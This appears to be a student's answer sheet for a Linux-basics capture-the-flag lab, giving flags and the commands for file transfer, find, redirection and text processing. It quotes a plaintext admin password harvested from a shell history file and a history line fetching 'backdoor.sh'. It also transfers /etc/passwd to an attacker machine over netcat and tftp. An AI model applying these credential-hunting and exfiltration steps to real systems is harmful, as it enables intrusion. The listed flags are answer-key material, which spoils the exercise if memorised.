# Basics_Linux_Kamkar
Exercices and Flags

## Bash_environment

1. On your student machine what is the value of the FLAG environment variable ?

> FLAG : BC{EXPORT_B4SH_FLAG}

1. Currently if you notice your machine, the variable you have created will be deleted. What should you do to make your variable persistent? (With a Bash shell).

> Commands : export command=something

1.  **From a hacker's perspective**, look for information that might be useful to you in the ``.history`` file.

> Your answer : 119 telnet 10.21.55.98 -login admin -pass MyP4ssW0rDiS3CuR3!

1.  **From an analyst's perspective**, look for information that might be useful to you in the ``.history`` file.

> Your answer : 95 wget http://10.88.56.53/backdoor.sh and the following lines

## Downloading_files

1. On your Kali machine, create a file named malware.php.

````  
echo "This is a malware file" > malware.php 
````
Then, in the same directory, ccreate a temporary server with python on port 5000.
````
python3 -m http.server 5000
````
2. On your Student machine, download the malware.txt file with the wget command.

> Your command : wget 192.168.149.15:5000/malware.php

4. On your Student machine, download the malware.txt file with the cURL command.

> Your command : curl -O 192.168.149.15:5000/malware.php

1. On the student machine, create a file named password.txt and transfer it to your student machine with netcat

> Your commands : nc -lvp 4444 < password.txt
> nc 10.12.181.103 4444 > password.txt

1. On the student machine, transfer ``/etc/passwd`` file to your kali machine with tftp

> the default folder where files are shared on the student machine is /var/lib/tftpboot so I copied passwd in there as root user first

> your commands : tftp 10.12.181.103
> get passwd

## Finding_files

1. Create a file named ``my-file.txt`` with the touch command. Then execute the ``locate my-file.txt`` command. Do you find the file?

> Your response : No

1. Run the command sudo ``updatedb``. And run the locate my-file.txt command again. Do you find your file ?

> Your response : Yes

1. With the command ``which``, find the executable file nc and indicate the path

> Path : /bin/nc

1. With the command ``which``, find the executable file becode. What is the flag ?

> Flag : BC{WH1CH_FL4G_EXECUTLE_FILE}

1. Search with ``find ``command for a file that contains the name "Edgar Allan Poe". What is the flag ?

> Flag : BC{3d54r_4ll4n_P03_FL45}

1. Using the ``find`` command, find the file password.txt and specify the flag.

> Flag : BC{PASSWORD_FILE}

1. With the command ``find``, find a file that starts with ``becode-`` and ends with ``.sh``.

> Flag : BC{FLAG_FIND_PARTIAL_PATH}

1. Using the ``find`` command to identify any file (not directory) modified in the last day, NOT owned by the root user and execute ls -l on them. **Chaining/piping commands is NOT allowed!**

> Your command : find / ! -user root -mtime -1 -ls

1. With the find command, find all the files that have an authorization of ``0777``.

> Your command : find / -perm -0777

1. With the find command, find all the files in the folder ``/home/student/findme/`` that have an authorization of ``0777`` and change the rights of these files to ``0755``

> Your command : find /home/student/findme/ -perm -0777 -exec chmod 0755 {} \;

## Piping_and_redirection

1. Write the message "hello everyone" in a file called "test" by redirecting the output of the echo command.

> Your command : echo "hello everyone" > test.txt

1. Write the message "goodbye" in the same file "test" by redirecting the output of the echo command and without overwriting the content of "test" and check with the cat command

> Your command : echo "goodbye" >> test.txt

1. Make the ``ls -la`` command redirect to the ``foo`` file

> Your command : ls -la > foo.txt

1. Execute ``find /etc -name *conf*`` command and redirect errors (only errors) to a file named err.txt

> Your command : find /etc -name *conf* 2> err.txt

1. Repeat the previous exercise, this time redirecting the errors to the linux nothingness.

> Your command : find /etc -name *conf* 2> /dev/null

1. Now redirect the standard output and the error output of the ``find /etc -name *conf*`` command to two different files (std.out and std.err)

> Your command : find /etc -name *conf* 2> errors.txt 1> output.txt

1. What does the mkfifo command do?

> No answer required

1. Create a pipe named "MyNammedPipe". Then execute the pwd command which will transmit the data in this pipe. Then use the cat command to read the contents of your "MyNammedPipe" pipe.

> Your commands : mkfifo MyNamedPipe pwd > MyNamedPipe 
> cat MyNamedPipe

1. With cat command, add number the lines in the file /etc/passwd with the command ``nl``

> Your commands : cat /etc/passwd | nl

1. Using the previous nl command, the head and tail commands, display the lines of /etc/passwd between line 7 and line 12

> Your commands : nl /etc/passwd | head -n 11 | tail -n 4

## Text_manipulation.md

1. Search all sequences containing "Loxondota" in ``/home/student/lorem.txt``

> Flag : BC{GREP_ME_LOREM_FL4G}

1. Copy the file /etc/passwd to your home directory. Display the line starting with ``student`` name.

> Your commands : cp passwd /home/student/passwd

> grep "^student" passwd

1. Display the lines in the passwd file starting with login names of 3 or 4 characters.

> Your commands : ``egrep "^[a-zA-Z0-9]{3,4}:" passwd``

1. In the file ``/home/student/sample.txt`` how many different values are there in the first column? in the second?

> Your response : 4 for both

> Your command : cut -d "," -f 1 /home/student/sample.txt | sort -u | wc -l

> cut -d "," -f 2 /home/student/sample.txt | sort -u | wc -l

1. In the file ``/home/student/sample.txt`` sort the values in the second column by frequency of occurrence. (uniq -c can be useful)

> Your command : cut -d "," -f 2 /home/student/sample.txt | sort | uniq -c | sort

1. In the file ``/home/student/iris.data`` Change the column separator (comma) to tab (make sure that the changes are applied to the file)

> Your command : sed -i 's/,/\t/g' /home/student/iris.data

1. In the file ``/home/student/iris.data``, extract from this file the column 3 (petal length in cm) (use cut )

> Your command : cut -f 3 /home/student/iris.data

1. In the file ``/home/student/iris.data``, count the number of flower species (cut and uniq)

> Your response : 3

> Your command : cut -f 5 /home/student/iris.data | uniq | grep . | wc -l

1. In the file ``/home/student/iris.data``, sort by increasing petal length (see sort options)

> Your command : sort -k 3 /home/student/iris.data

1. In the file ``/home/student/iris.data``, show only lines with petal length greater than the average size

> Your command : average=`awk '{ total += $3 } END {print total/NR}' /home/student/iris.data`

> awk -v avg="$average" '$3 > avg {print}' /home/student/iris.data

1. Using ``/etc/passwd``, extract the user and home directory fields for all users on your student machine for which the shell is set to ``/bin/false``.

> Your command : grep "/bin/false$" /etc/passwd | cut -d ":" -f 1,6





